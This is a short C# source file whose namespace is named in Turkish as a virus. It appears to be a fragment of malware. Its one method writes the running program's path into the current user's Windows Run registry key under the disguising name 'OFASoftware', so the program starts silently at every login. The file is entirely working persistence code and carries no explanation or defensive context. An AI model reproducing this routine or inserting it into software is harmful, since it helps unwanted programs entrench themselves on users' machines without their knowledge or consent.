


using System.Windows.Forms;

namespace virüs_sakın_açma
{
    class vrs1
    { 
    
        public static  void vrsp1()
        {

            using (Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true))
            {
                key.SetValue("OFASoftware", "\"" + Application.ExecutablePath + "\"");
            }


            
        }
    }
}
